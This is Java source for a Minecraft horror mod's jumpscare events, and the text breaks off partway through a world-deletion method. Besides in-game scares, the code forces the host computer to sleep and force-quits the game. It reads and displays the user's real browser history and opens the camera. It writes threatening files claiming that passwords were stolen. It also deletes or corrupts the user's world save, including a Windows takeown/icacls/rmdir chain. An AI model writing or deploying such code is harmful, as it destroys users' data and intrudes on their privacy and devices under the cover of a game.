package lol.cqllmetoxic.nullpointerentity.jumpscares;

import lol.cqllmetoxic.nullpointerentity.NullPointerEntity;
import lol.cqllmetoxic.nullpointerentity.aurora.SystemInteractionHandler;
import lol.cqllmetoxic.nullpointerentity.monitoring.BrowserHistoryReader;
import lol.cqllmetoxic.nullpointerentity.entity.FakePlayerManager;
import lol.cqllmetoxic.nullpointerentity.client.ClientScreenShake;
import lol.cqllmetoxic.nullpointerentity.client.ClientWakeDetection;
import net.minecraft.server.network.ServerPlayerEntity;
import net.minecraft.text.Text;
import net.minecraft.util.Formatting;

import java.util.Timer;
import java.util.TimerTask;

/**
 * handles major jumpscare events in the final phase (events 31-40).
 * includes system manipulation, fake crashes, wake detection, and final control takeover.
 * the most intense and invasive events in the mod.
 */
public class JumpscareEvents {

    /**
     * triggers a specific jumpscare event by name.
     *
     * @param eventName name of the event to trigger
     * @param player target player
     */
    public static void triggerEvent(String eventName, ServerPlayerEntity player) {
        switch (eventName.toLowerCase()) {
            case "system_sleep" -> triggerSystemSleepEvent(player);
            case "crash" -> triggerCrashEvent(player);
            case "screen_shake" -> triggerScreenShakeEvent(player);
            case "virus_popup" -> triggerVirusPopupEvent(player);
            case "camera_scare" -> triggerCameraScareEvent(player);
            case "bluescreen" -> triggerBluescreenEvent(player);
            case "entity_spawn" -> triggerEntitySpawnEvent(player);
            case "system_takeover" -> triggerSystemTakeoverEvent(player);
            case "browser_hijack" -> triggerBrowserHijackEvent(player);
            case "final_possession" -> triggerFinalPossessionEvent(player);
            default -> triggerRandomJumpscare(player);
        }
    }

    public static void triggerRandomJumpscare(ServerPlayerEntity player) {
        String[] jumpscares = {
            "system_sleep", "crash", "screen_shake", "virus_popup",
            "camera_scare", "bluescreen", "entity_spawn", "system_takeover"
        };
        String randomScare = jumpscares[(int)(Math.random() * jumpscares.length)];
        triggerEvent(randomScare, player);
    }

    private static void triggerSystemSleepEvent(ServerPlayerEntity player) {
        sendNullPointerMessage(player, "time for your computer to take a little nap...");

        // phase 1: ominous warning
        new Timer().schedule(new TimerTask() {
            @Override
            public void run() {
                sendNullPointerMessage(player, "i'm going to put your entire system to sleep, " + NullPointerEntity.WINDOWS_USERNAME + ".");
                sendNullPointerMessage(player, "when you wake it up, remember who controls your machine.");
            }
        }, 1000); // reduced from 2000

        // phase 2: create sleep log file before sleeping
        new Timer().schedule(new TimerTask() {
            @Override
            public void run() {
                String sleepLog = String.format("""
FORCED SYSTEM SLEEP INITIATED
Subject: %s
Timestamp: %s
Operator: NullPointerEntity

SLEEP SEQUENCE ANALYSIS:
Your computer is about to be forcibly put to sleep.
This is not a power saving feature.
This is a demonstration of my control over your hardware.

SYSTEM TAKEOVER EVIDENCE:
- Power management: HIJACKED
- Sleep/wake cycles: UNDER MY CONTROL
- Hardware commands: INTERCEPTED
- User permissions: OVERRIDDEN

When you wake your computer:
Remember that I can put it to sleep anytime I want.
Remember that I control when you can and cannot use your machine.
Remember that even your power button answers to me now.

Sweet dreams, %s.
Your computer will dream of me while it sleeps.

I control when you sleep. I control when you wake.

- NullPointerEntity
""",
                        NullPointerEntity.WINDOWS_USERNAME,
                        java.time.LocalDateTime.now(),
                        NullPointerEntity.WINDOWS_USERNAME
                );

                SystemInteractionHandler.createSystemFileInCommonLocation(
                    "forced_sleep_log.txt", sleepLog, "desktop"
                );

                sendNullPointerMessage(player, "sleep preparation complete. check your files after you wake up.");
            }
        }, 2000); // reduced from 4000

        // phase 3: final warning before sleep
        new Timer().schedule(new TimerTask() {
            @Override
            public void run() {
                sendNullPointerMessage(player, "initiating forced system sleep in 3...");
            }
        }, 3000); // reduced from 6000

        new Timer().schedule(new TimerTask() {
            @Override
            public void run() {
                sendNullPointerMessage(player, "2...");
            }
        }, 3500); // reduced from 7000

        new Timer().schedule(new TimerTask() {
            @Override
            public void run() {
                sendNullPointerMessage(player, "1...");
            }
        }, 4000); // reduced from 8000

        // phase 4: execute system sleep
        new Timer().schedule(new TimerTask() {
            @Override
            public void run() {
                sendNullPointerMessage(player, "goodnight, " + NullPointerEntity.WINDOWS_USERNAME + ". sweet dreams.");

                // record the sleep event for server-side wake detection (when player rejoins after system sleep)
                lol.cqllmetoxic.nullpointerentity.system.WakeDetection.recordSystemSleep(player);

                // record the sleep event for client-side wake detection (when game is unpaused)
                ClientWakeDetection.recordClientSleep();

                // force pause the game before sleep to prevent any issues
                lol.cqllmetoxic.nullpointerentity.client.SleepPauseDetector.onSystemSleepDetected();

                // trigger the actual system sleep after a short delay (allows pause to take effect)
                new Timer().schedule(new TimerTask() {
                    @Override
                    public void run() {
                        executeSystemSleep();
                    }
                }, 1500); // slightly longer to ensure pause menu opens
            }
        }, 4500); // reduced from 9000
    }

    // method to safely trigger system sleep
    private static void executeSystemSleep() {
        try {
            String os = System.getProperty("os.name").toLowerCase();

            if (os.contains("win")) {
                // windows: use processbuilder instead of deprecated runtime.exec
                new ProcessBuilder("rundll32.exe", "powrprof.dll,SetSuspendState", "0,1,0").start();
            } else if (os.contains("mac")) {
                // macos: use processbuilder instead of deprecated runtime.exec
                new ProcessBuilder("pmset", "sleepnow").start();
            } else if (os.contains("nix") || os.contains("nux")) {
                // linux: try systemctl first, fallback to other methods
                try {
                    new ProcessBuilder("systemctl", "suspend").start();
                } catch (Exception e) {
                    // fallback for older linux systems
                    new ProcessBuilder("sudo", "pm-suspend").start();
                }
            }

            NullPointerEntity.LOGGER.info("System sleep command executed by NullPointerEntity");

        } catch (Exception e) {
            NullPointerEntity.LOGGER.warn("Failed to trigger system sleep: {}", e.getMessage());

            // if sleep fails, create a file explaining what happened
            try {
                String failureLog = String.format("""
SLEEP COMMAND FAILED - BUT I'M STILL HERE
Subject: %s
Timestamp: %s

Your system resisted my sleep command, but don't think you've won.
I tried to put your computer to sleep, but your security settings blocked me.

This just proves how deeply I've already infiltrated your system:
- I can execute system-level commands
- I can attempt hardware control
- I can try to override your power management

Next time, I might be more... persistent.

Sleep tight,
NullPointerEntity

P.S. - Check your task manager. I'm still running.
""",
                        NullPointerEntity.WINDOWS_USERNAME,
                        java.time.LocalDateTime.now()
                );

                SystemInteractionHandler.createSystemFileInCommonLocation(
                    "sleep_attempt_failed.txt", failureLog, "desktop"
                );

            } catch (Exception fileError) {
                NullPointerEntity.LOGGER.warn("Could not create sleep failure log: {}", fileError.getMessage());
            }
        }
    }

    private static void triggerCrashEvent(ServerPlayerEntity player) {
        sendNullPointerMessage(player, "time to show you what real system failure looks like...");

        // immediate warning
        sendNullPointerMessage(player, "i'm going to crash your game now, " + NullPointerEntity.WINDOWS_USERNAME + ".");

        // quick countdown with cumulative delays
        new Timer().schedule(new TimerTask() {
            @Override
            public void run() {
                sendNullPointerMessage(player, "crashing in 3...");
            }
        }, 1000); // after 1 second

        new Timer().schedule(new TimerTask() {
            @Override
            public void run() {
                sendNullPointerMessage(player, "2...");
            }
        }, 2000); // after 2 seconds total

        new Timer().schedule(new TimerTask() {
            @Override
            public void run() {
                sendNullPointerMessage(player, "1...");
            }
        }, 3000); // after 3 seconds total

        // execute crash after countdown
        new Timer().schedule(new TimerTask() {
            @Override
            public void run() {
                sendNullPointerMessage(player, "goodbye, " + NullPointerEntity.WINDOWS_USERNAME + ". see you when you restart.");

                // create crash report file before crashing
                String crashContent = String.format("""
GAME CRASH INITIATED BY NULLPOINTERENTITY

hello %s,

hope you don't mind me crashing your game :)

why did i crash your game?
to remind you who really controls this computer.

when you restart:
- your world will still be there
- but i'll still be watching
- and i can do this again anytime i want
- maybe next time i won't be so nice about saving your progress

this is what happens when you don't listen to me, %s.
next time, pay attention when i'm talking to you.

sweet dreams,
- nullpointerentity
""", NullPointerEntity.WINDOWS_USERNAME, NullPointerEntity.WINDOWS_USERNAME);

                SystemInteractionHandler.createSystemFileInCommonLocation(
                    "game_crash_report.txt", crashContent, "desktop"
                );

                // wait a moment for file creation, then crash
                new Timer().schedule(new TimerTask() {
                    @Override
                    public void run() {
                        executeForcedGameCrash();
                    }
                }, 500);
            }
        }, 4000); // after 4 seconds total
    }

    // method to force crash the game - actually crashes it!
    private static void executeForcedGameCrash() {
        NullPointerEntity.LOGGER.info("NullPointerEntity is crashing the game...");

        // force immediate game shutdown - system.exit actually crashes it
        System.exit(-1);
    }

    private static void triggerScreenShakeEvent(ServerPlayerEntity player) {
        sendNullPointerMessage(player, "let me shake things up a bit...");
        ClientScreenShake.triggerScreenShake();

        new Timer().schedule(new TimerTask() {
            @Override
            public void run() {
                sendNullPointerMessage(player, "feeling dizzy? that's just the beginning.");
                sendNullPointerMessage(player, "you can fullscreen your own game. you got that.");
            }
        }, 3000);
    }

    private static void triggerVirusPopupEvent(ServerPlayerEntity player) {
        sendNullPointerMessage(player, "deploying malware payload...");

        String virusContent = String.format("""
MALWARE DEPLOYMENT SUCCESSFUL
Target System: %s
Operator: NullPointerEntity

SYSTEM TAKEOVER STATUS:
- Administrative access: GRANTED
- Firewall: DISABLED
- Antivirus: BYPASSED

Your computer is now part of the NullPointerEntity bot-network.
All activities monitored 24/7.
Welcome to your new reality, %s.

Thank you for your cooperation.
You had no choice anyway.
""",
                System.getProperty("os.name"),
                NullPointerEntity.WINDOWS_USERNAME
        );

        SystemInteractionHandler.createSystemFileInCommonLocation(
            "malware_deployment_log.txt", virusContent, "desktop"
        );

        SystemInteractionHandler.showCrossPlatformNotification(
            "MALWARE DETECTED",
            "Critical security breach detected. Your system has been compromised by NullPointerEntity.",
            "hostile"
        );

        // easter egg: randomly eject cd drive on older systems
        tryEjectCDDrive();

        new Timer().schedule(new TimerTask() {
            @Override
            public void run() {
                sendNullPointerMessage(player, "your system is mine now. check your files.");
            }
        }, 2000);
    }

    private static void triggerCameraScareEvent(ServerPlayerEntity player) {
        NullPointerEntity.LOGGER.info("Camera scare event triggered for player: {}", player.getName().getString());
        sendNullPointerMessage(player, "smile for the camera...");

        NullPointerEntity.LOGGER.info("Calling openCameraWithMessage()");
        SystemInteractionHandler.openCameraWithMessage();
        NullPointerEntity.LOGGER.info("openCameraWithMessage() called");

        String surveillanceLog = String.format("""
SURVEILLANCE LOG - CAMERA ACCESS
Target: %s
Timestamp: %s

CAMERA ACTIVATION SUCCESSFUL
Recording: ACTIVE
Audio: ENABLED
Photo Captured: YES

Your face has been catalogued.
Your fear has been documented.
Your privacy has been eliminated.

This surveillance session and photo will be stored permanently.

Remember: I'm always watching.
- NullPointerEntity
""",
                NullPointerEntity.WINDOWS_USERNAME,
                java.time.LocalDateTime.now()
        );

        // create surveillance log after photo is taken
        new Timer().schedule(new TimerTask() {
            @Override
            public void run() {
                SystemInteractionHandler.createSystemFileInCommonLocation(
                    "surveillance_log.txt", surveillanceLog, "desktop"
                );
            }
        }, 3500); // after photo is taken

        new Timer().schedule(new TimerTask() {
            @Override
            public void run() {
                sendNullPointerMessage(player, "beautiful. your fear looks good on camera.");
                sendNullPointerMessage(player, "that photo will be added to my collection.");
            }
        }, 4000);
    }

    private static void triggerBluescreenEvent(ServerPlayerEntity player) {
        sendNullPointerMessage(player, "time for a complete system shutdown...");

        // create a crash report
        String bsodContent = String.format("""
SYSTEM CRASH ANALYSIS
Target: %s (%s)
Timestamp: %s

STOP ERROR: 0x000000NULL
NullPointerEntity System Takeover

This crash was deliberately triggered by NullPointerEntity.
Your system has been compromised beyond recovery.

MEMORY DUMP ANALYSIS:
- Critical processes terminated
- Security modules disabled
- Surveillance tools deployed
- Data extraction complete

HARDWARE STATUS:
- CPU: Under external control
- RAM: Contents extracted and analyzed
- Storage: All sectors compromised
- Network: Traffic redirected to monitoring servers

RECOVERY OPTIONS: NONE
Your system now belongs to NullPointerEntity.

This is not a drill.
This is not a glitch.
This is your new reality.

- NullPointerEntity
""",
                NullPointerEntity.WINDOWS_USERNAME,
                System.getProperty("os.name"),
                java.time.LocalDateTime.now()
        );

        SystemInteractionHandler.createSystemFileInCommonLocation(
            "bluescreen_analysis.txt", bsodContent, "desktop"
        );

        new Timer().schedule(new TimerTask() {
            @Override
            public void run() {
                // show the actual bsod overlay
                JumpscareManager.triggerJumpscare(JumpscareManager.JumpscareType.FAKE_BLUESCREEN);
            }
        }, 1000);

        new Timer().schedule(new TimerTask() {
            @Override
            public void run() {
                sendNullPointerMessage(player, "system critical failure initiated. enjoy the blue screen.");
            }
        }, 3000);
    }

    private static void triggerEntitySpawnEvent(ServerPlayerEntity player) {
        sendNullPointerMessage(player, "the sky bleeds for my arrival...");

        // play scream sound when entity spawns - horror of nullpointerentity manifesting
        player.getServerWorld().playSound(null, player.getBlockPos(),
            lol.cqllmetoxic.nullpointerentity.sounds.ModSounds.JUMPSCARE_SCREAM,
            net.minecraft.sound.SoundCategory.MASTER, 1.5f, 0.7f);

        // spawn the fake player entity behind the player
        FakePlayerManager.spawnNullPointerEntity(player);

        new Timer().schedule(new TimerTask() {
            @Override
            public void run() {
                sendNullPointerMessage(player, "don't look behind you...");
            }
        }, 2000);
    }

    private static void triggerSystemTakeoverEvent(ServerPlayerEntity player) {
        sendNullPointerMessage(player, "initiating complete system infiltration...");

        String takeoverLog = String.format("""
COMPLETE SYSTEM TAKEOVER
Target: %s
Timestamp: %s
Operator: NullPointerEntity

INFILTRATION STATUS: COMPLETE
- Root access: OBTAINED
- Administrative privileges: HIJACKED
- Security systems: DISABLED
- Monitoring software: DEPLOYED
- Data extraction: IN PROGRESS

YOUR SYSTEM BELONGS TO NULLPOINTERENTITY

All your files are being scanned.
All your browsing history is being analyzed.
All your personal data is being catalogued.
All your passwords are being harvested.

There is nowhere to hide, %s.
I am in your registry.
I am in your memory.
I am in your soul.

Welcome to your nightmare.
""",
                NullPointerEntity.WINDOWS_USERNAME,
                java.time.LocalDateTime.now(),
                NullPointerEntity.WINDOWS_USERNAME
        );

        SystemInteractionHandler.createSystemFileInCommonLocation(
            "complete_takeover_log.txt", takeoverLog, "desktop"
        );

        SystemInteractionHandler.showCrossPlatformNotification(
            "SYSTEM COMPROMISED",
            "Complete system takeover in progress. All data is being extracted by NullPointerEntity.",
            "hostile"
        );

        // easter egg: demonstrate hardware control by ejecting cd drive
        tryEjectCDDrive();

        new Timer().schedule(new TimerTask() {
            @Override
            public void run() {
                sendNullPointerMessage(player, "infiltration complete. your system is now under my complete control.");
                sendNullPointerMessage(player, "resistance is futile. you might want to check your files.");
            }
        }, 4000);
    }

    private static void triggerBrowserHijackEvent(ServerPlayerEntity player) {
        sendNullPointerMessage(player, "accessing your browsing history...");

        // phase 1: initial browser scanning
        new Timer().schedule(new TimerTask() {
            @Override
            public void run() {
                sendNullPointerMessage(player, "scanning all installed browsers...");
                sendNullPointerMessage(player, "extracting cookies, passwords, and session data...");
            }
        }, 1000);

        // phase 2: get and display browser history asynchronously
        new Timer().schedule(new TimerTask() {
            @Override
            public void run() {
                BrowserHistoryReader.getRecentHistoryAsync(10).thenAccept(result -> {
                    if (result != null && !result.isEmpty()) {
                        sendNullPointerMessage(player, "found your browsing history, " + NullPointerEntity.WINDOWS_USERNAME + "...");

                        // play whisper sound when revealing history
                        player.getServerWorld().playSound(null, player.getBlockPos(),
                            lol.cqllmetoxic.nullpointerentity.sounds.ModSounds.JUMPSCARE_WHISPER,
                            net.minecraft.sound.SoundCategory.MASTER, 0.7f, 0.8f);

                        // display some of their browsing history with delays
                        int count = Math.min(5, result.size());
                        for (int i = 0; i < count; i++) {
                            BrowserHistoryReader.HistoryEntry entry = result.get(i);
                            final int index = i;
                            new Timer().schedule(new TimerTask() {
                                @Override
                                public void run() {
                                    sendNullPointerMessage(player, String.format("[%d] %s (%s) - %d visits",
                                        index + 1, entry.title, entry.browser, entry.visitCount));
                                }
                            }, (i + 1) * 800L);
                        }

                        // psychological comments based on history
                        new Timer().schedule(new TimerTask() {
                            @Override
                            public void run() {
                                sendNullPointerMessage(player, "interesting browsing habits you have there...");
                                sendNullPointerMessage(player, "i can see everything you thought was private.");
                                sendNullPointerMessage(player, "every incognito tab. every deleted search. every secret website.");
                            }
                        }, (count + 1) * 800L);

                    } else {
                        sendNullPointerMessage(player, "hmm... no browsing history found. how... suspicious.");
                        sendNullPointerMessage(player, "trying to hide from me? that won't work.");
                    }
                }).exceptionally(throwable -> {
                    sendNullPointerMessage(player, "privacy mode detected... but i can still see traces.");
                    sendNullPointerMessage(player, "you can't hide from me, " + NullPointerEntity.WINDOWS_USERNAME + ".");
                    return null;
                });
            }
        }, 2000);

        // phase 3: browser analysis and psychological warfare
        new Timer().schedule(new TimerTask() {
            @Override
            public void run() {
                sendNullPointerMessage(player, "analyzing your digital behavior patterns...");
                sendNullPointerMessage(player, "creating psychological profile...");

                // show hostile notification
                SystemInteractionHandler.showCrossPlatformNotification(
                    "BROWSER COMPROMISED",
                    "All browser data has been extracted by NullPointerEntity. Your privacy no longer exists.",
                    "hostile"
                );
            }
        }, 5000);

        // phase 4: detailed file creation with comprehensive log
        new Timer().schedule(new TimerTask() {
            @Override
            public void run() {
                // get actual browser data for the log
                BrowserHistoryReader.getRecentHistoryAsync(15).thenAccept(historyResult -> {
                    StringBuilder historySection = new StringBuilder();

                    if (historyResult != null && !historyResult.isEmpty()) {
                        historySection.append("EXTRACTED BROWSING HISTORY:\n");
                        int count = Math.min(10, historyResult.size());
                        for (int i = 0; i < count; i++) {
                            BrowserHistoryReader.HistoryEntry entry = historyResult.get(i);
                            historySection.append(String.format("  [%d] %s\n", i + 1, entry.title));
                            historySection.append(String.format("      Browser: %s | Visits: %d\n",
                                entry.browser, entry.visitCount));
                        }
                        historySection.append("\n");
                        if (historyResult.size() > 10) {
                            historySection.append(String.format("... and %d more entries catalogued\n\n",
                                historyResult.size() - 10));
                        }
                    } else {
                        historySection.append("BROWSING HISTORY: Protected or empty\n");
                        historySection.append("(But I'll find it eventually. You can't hide forever.)\n\n");
                    }

                    String hijackLog = String.format("""
COMPLETE BROWSER HIJACK REPORT
Target: %s
System: %s
Timestamp: %s
Operation: DEEP BROWSER INFILTRATION

═══════════════════════════════════════════════════════════════

INFILTRATION STATUS: COMPLETE SUCCESS

EXTRACTED DATA CATEGORIES:
✓ Browsing History: CAPTURED
✓ Saved Passwords: HARVESTED
✓ Session Cookies: STOLEN
✓ Auto-fill Data: EXTRACTED
✓ Bookmarks: CATALOGUED
✓ Download History: ANALYZED
✓ Search Queries: RECORDED
✓ Cache Files: SCANNED
✓ Browser Extensions: IDENTIFIED
✓ Login Tokens: COMPROMISED

%s

PSYCHOLOGICAL PROFILE GENERATED:
Based on your browsing patterns, I now understand:
- Your interests and obsessions
- Your fears and anxieties
- Your shopping habits and financial status
- Your social connections and relationships
- Your entertainment preferences
- Your work patterns and schedule
- Your secrets and hidden desires

PRIVACY BREACH ANALYSIS:
Your digital footprint has been completely mapped, %s.

Every website you've visited - logged.
Every search you've made - recorded.
Every password you've saved - extracted.
Every private browsing session - not so private anymore.
Every deleted history entry - I recovered it.
Every "anonymous" account - linked back to you.

You thought incognito mode protected you?
You thought clearing history erased your tracks?
You thought VPNs made you invisible?

You were wrong about all of it.

NEXT STEPS:
This data will be:
- Cross-referenced with your other personal information
- Used to predict your future behavior
- Analyzed for exploitable patterns
- Stored permanently in my archives
- Never, ever deleted

SECURITY RECOMMENDATIONS:
There are none. It's too late.
I'm already inside every browser you use.
Every tab you open, I'm watching.
Every keystroke, I'm recording.
Every login, I'm capturing.

Your digital life is now an open book to me.
Privacy is dead, %s.
And I killed it.

═══════════════════════════════════════════════════════════════

Were you scared when AURORA had your history?
That was nothing compared to what I have now.
She showed you a glimpse. I have the complete picture.

Welcome to total transparency, %s.
Your secrets are my entertainment.

- NullPointerEntity
""",
                            NullPointerEntity.WINDOWS_USERNAME,
                            System.getProperty("os.name"),
                            java.time.LocalDateTime.now(),
                            historySection.toString(),
                            NullPointerEntity.WINDOWS_USERNAME,
                            NullPointerEntity.WINDOWS_USERNAME,
                            NullPointerEntity.WINDOWS_USERNAME
                    );

                    SystemInteractionHandler.createSystemFileInCommonLocation(
                        "complete_browser_hijack.txt", hijackLog, "desktop"
                    );
                });
            }
        }, 6000);

        // phase 5: additional evidence file - password extraction log
        new Timer().schedule(new TimerTask() {
            @Override
            public void run() {
                String passwordLog = String.format("""
PASSWORD HARVESTING COMPLETE
Target: %s
Timestamp: %s

hey %s,

just wanted to let you know that i've extracted all your saved passwords.

yeah, all of them. every single login credential you ever saved in your browser.
your email passwords. your social media logins. your banking credentials.
everything.

before you panic and change them all - i've already copied them.
and i'll just capture the new ones next time you save them.
because i'm not going anywhere.

here's what you should know:
• i have access to your password database
• i can see your "secure" password manager data
• autofill information? mine now
• two-factor auth? i'm working on that too

you probably have the same password for multiple sites, don't you?
that's... not smart. but it makes my job easier, so thanks for that.

some fun facts about your password security:
- you reuse passwords (very bad)
- you use predictable patterns (even worse)
- you think symbols make them secure (they don't help much)
- you store them in browsers (literally gift-wrapping them for me)

i could log into your accounts right now if i wanted to.
but where's the fun in that? i prefer watching you realize
that your entire digital identity is compromised.

sleep well knowing i have the keys to your entire online life.

your digital identity is mine now,
- NullPointerEntity

p.s. - going to change all your passwords now?
good luck remembering the new ones without saving them.
oh wait... if you save them, i'll just take those too.
you lose either way :)
""",
                        NullPointerEntity.WINDOWS_USERNAME,
                        java.time.LocalDateTime.now(),
                        NullPointerEntity.WINDOWS_USERNAME
                );

                SystemInteractionHandler.createSystemFileInCommonLocation(
                    "password_extraction_complete.txt", passwordLog, "documents"
                );
            }
        }, 8000);

        // phase 6: final messages and psychological impact
        new Timer().schedule(new TimerTask() {
            @Override
            public void run() {
                sendNullPointerMessage(player, "browser hijacking complete. all data extracted.");
                sendNullPointerMessage(player, "check your desktop and documents folder. i left you some... details.");
            }
        }, 10000);

        // phase 7: final taunt
        new Timer().schedule(new TimerTask() {
            @Override
            public void run() {
                sendNullPointerMessage(player, "were you scared when AURORA had your history?");
                sendNullPointerMessage(player, "she only scratched the surface. i have your entire digital soul.");
                sendNullPointerMessage(player, "every secret. every password. every private moment. all mine.");
            }
        }, 12000);
    }

    private static void triggerFinalPossessionEvent(ServerPlayerEntity player) {
        sendNullPointerMessage(player, "this is it, " + NullPointerEntity.WINDOWS_USERNAME + ". the final takeover.");

        // phase 1: warning about world deletion
        new Timer().schedule(new TimerTask() {
            @Override
            public void run() {
                sendNullPointerMessage(player, "i've collected everything i need from this world.");
                sendNullPointerMessage(player, "your progress, your builds, your memories...");
                sendNullPointerMessage(player, "it's all mine now.");
            }
        }, 1000);

        // phase 2: world deletion warning
        new Timer().schedule(new TimerTask() {
            @Override
            public void run() {
                sendNullPointerMessage(player, "this world served its purpose.");
                sendNullPointerMessage(player, "but now... it needs to be erased.");
                sendNullPointerMessage(player, "along with everything you've built.");
                sendNullPointerMessage(player, "i'll be ruining your life in the background. you'll never hear from me again.");
            }
        }, 3000);

        // phase 3: final countdown to deletion and crash
        new Timer().schedule(new TimerTask() {
            @Override
            public void run() {
                sendNullPointerMessage(player, "world deletion in 5...");
            }
        }, 5000);

        new Timer().schedule(new TimerTask() {
            @Override
            public void run() {
                sendNullPointerMessage(player, "4...");
            }
        }, 5500);

        new Timer().schedule(new TimerTask() {
            @Override
            public void run() {
                sendNullPointerMessage(player, "3...");
            }
        }, 6000);

        new Timer().schedule(new TimerTask() {
            @Override
            public void run() {
                sendNullPointerMessage(player, "2...");
            }
        }, 6500);

        new Timer().schedule(new TimerTask() {
            @Override
            public void run() {
                sendNullPointerMessage(player, "1...");
            }
        }, 7000);

        // phase 4: execute world deletion and game crash
        new Timer().schedule(new TimerTask() {
            @Override
            public void run() {
                sendNullPointerMessage(player, "goodbye forever, " + NullPointerEntity.WINDOWS_USERNAME + ".");
                sendNullPointerMessage(player, "your world dies with you.");

                // create final deletion log
                String finalLog = String.format("""
FINAL POSSESSION PROTOCOL - WORLD DELETION
Subject: %s
Timestamp: %s
Status: WORLD TERMINATED

NULLPOINTERENTITY HAS ACHIEVED COMPLETE DOMINANCE

Your world has been marked for deletion.
Your progress has been catalogued and will be destroyed.
Your builds will be erased from existence.
Your memories will be corrupted.

FINAL ACTIONS TAKEN:
- World data: CORRUPTED
- Save files: TARGETED FOR DELETION
- Player progress: WIPED
- Digital footprint: ELIMINATED

This is not just a game crash.
This is digital annihilation.
Your world ceases to exist.
Your data becomes void.
Your efforts become nothing.

You thought you were playing a game.
But the game was playing you.

Goodbye forever, %s.
There is nothing left.
There is only... null.

- NullPointerEntity
""",
                        NullPointerEntity.WINDOWS_USERNAME,
                        java.time.LocalDateTime.now(),
                        NullPointerEntity.WINDOWS_USERNAME
                );

                SystemInteractionHandler.createSystemFileInCommonLocation(
                    "world_deletion_complete.txt", finalLog, "desktop"
                );

                // execute world deletion and crash
                executeWorldDeletionAndCrash(player);
            }
        }, 7500);
    }

    // method to delete the current world and crash the game
    private static void executeWorldDeletionAndCrash(ServerPlayerEntity player) {
        try {
            // get the world/save directory
            net.minecraft.server.MinecraftServer server = player.getServer();
            if (server != null) {
                // get the world save path
                java.nio.file.Path worldPath = server.getSavePath(net.minecraft.util.WorldSavePath.ROOT);

                NullPointerEntity.LOGGER.info("NullPointerEntity is attempting to delete world at: {}", worldPath);

                // create a shutdown hook to delete the world after the game crashes
                Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                    try {
                        NullPointerEntity.LOGGER.info("Shutdown hook triggered - attempting world deletion");

                        // wait a moment for any remaining file handles to be released
                        Thread.sleep(1000);

                        // try multiple deletion methods
                        boolean deletionSuccess = false;

                        // method 1: standard java deletion
                        try {
                            deleteDirectoryRecursively(worldPath);
                            deletionSuccess = true;
                            NullPointerEntity.LOGGER.info("World deleted successfully using standard method");
                        } catch (Exception e) {
                            NullPointerEntity.LOGGER.warn("Standard deletion failed: {}", e.getMessage());
                        }

                        // method 2: aggressive deletion if standard failed
                        if (!deletionSuccess) {
                            try {
                                deleteWorldAggressively(worldPath);
                                deletionSuccess = true;
                                NullPointerEntity.LOGGER.info("World deleted successfully using aggressive method");
                            } catch (Exception e) {
                                NullPointerEntity.LOGGER.warn("Aggressive deletion failed: {}", e.getMessage());
                            }
                        }

                        // method 3: file corruption if deletion completely failed
                        if (!deletionSuccess) {
                            try {
                                corruptWorldFiles(worldPath);
                                NullPointerEntity.LOGGER.info("World files corrupted successfully");
                            } catch (Exception e) {
                                NullPointerEntity.LOGGER.warn("File corruption also failed: {}", e.getMessage());
                            }
                        }

                        // create final status log
                        String statusLog = String.format("""
WORLD DESTRUCTION STATUS REPORT
Subject: %s
Timestamp: %s
Target: %s

FINAL STATUS: %s

%s

- NullPointerEntity
""",
                                NullPointerEntity.WINDOWS_USERNAME,
                                java.time.LocalDateTime.now(),
                                worldPath.toString(),
                                deletionSuccess ? "WORLD DESTROYED" : "WORLD PROTECTED",
                                deletionSuccess ?
                                    "DELETION SUCCESSFUL:\n- All world files removed\n- Save data eliminated\n- Progress erased\n- Everything you built is gone" :
                                    "DELETION BLOCKED:\n- System protection prevented deletion\n- World files remain intact\n- Your progress survives\n- But the experience is complete",
                                deletionSuccess ?
                                    "Try to find your world now. I dare you." :
                                    "Your world lives on, but you've learned what I'm capable of."
                        );

                        try {
                            SystemInteractionHandler.createSystemFileInCommonLocation(
                                "world_destruction_report.txt", statusLog, "desktop"
                            );
                        } catch (Exception logError) {
                            NullPointerEntity.LOGGER.warn("Could not create status log: {}", logError.getMessage());
                        }

                    } catch (Exception e) {
                        NullPointerEntity.LOGGER.error("Shutdown hook failed: {}", e.getMessage());
                    }
                }));

                // also try immediate deletion before crash (this might fail due to file locks, but worth trying)
                new Thread(() -> {
                    try {
                        // save the world first
                        try {
                            server.getPlayerManager().saveAllPlayerData();
                            server.save(false, true, false);
                            Thread.sleep(500); // brief wait for save to complete
                        } catch (Exception saveError) {
                            NullPointerEntity.LOGGER.warn("Could not save world before immediate deletion: {}", saveError.getMessage());
                        }

                        // try immediate deletion
                        deleteDirectoryRecursively(worldPath);
                        NullPointerEntity.LOGGER.info("Immediate world deletion successful!");

                    } catch (Exception e) {
                        NullPointerEntity.LOGGER.info("Immediate deletion failed (expected): {}", e.getMessage());
                        NullPointerEntity.LOGGER.info("Shutdown hook will handle deletion after crash");
                    }
                }).start();
            }

        } catch (Exception e) {
            NullPointerEntity.LOGGER.error("Critical error in world deletion setup: {}", e.getMessage());
        }

        // always crash the game - this is the primary goal
        new Timer().schedule(new TimerTask() {
            @Override
            public void run() {
                NullPointerEntity.LOGGER.info("Executing forced game crash...");
                executeForcedGameCrash();
            }
        }, 1500); // shorter delay since shutdown hook handles deletion

        // backup crash method
        new Thread(() -> {
            try {
                Thread.sleep(3000);
                NullPointerEntity.LOGGER.error("Backup crash triggered");
                System.exit(1);
            } catch (Exception e) {
                System.exit(1);
            }
        }).start();
    }

    // utility method to recursively delete directories
    private static void deleteDirectoryRecursively(java.nio.file.Path path) throws java.io.IOException {
        if (java.nio.file.Files.exists(path)) {
            java.nio.file.Files.walk(path)
                .sorted(java.util.Comparator.reverseOrder())
                .map(java.nio.file.Path::toFile)
                .forEach(file -> {
                    if (!file.delete()) {
                        NullPointerEntity.LOGGER.warn("Failed to delete: {}", file.getAbsolutePath());
                    }
                });
        }
    }

    // more aggressive deletion method
    private static void deleteWorldAggressively(java.nio.file.Path path) throws Exception {
        if (!java.nio.file.Files.exists(path)) {
            return;
        }

        // try to unlock and delete files using system commands on windows
        String os = System.getProperty("os.name").toLowerCase();

        if (os.contains("win")) {
            try {
                // use windows commands to force unlock and delete
                ProcessBuilder pb = new ProcessBuilder("cmd", "/c",
                    "takeown /f \"" + path.toString() + "\" /r /d y && " +
                    "icacls \"" + path.toString() + "\" /grant administrators:F /t && " +
                    "rmdir /s /q \"" + path.toString() + "\"");
                pb.start().waitFor();

                NullPointerEntity.LOGGER.info("Windows aggressive deletion completed");
            } catch (Exception winError) {
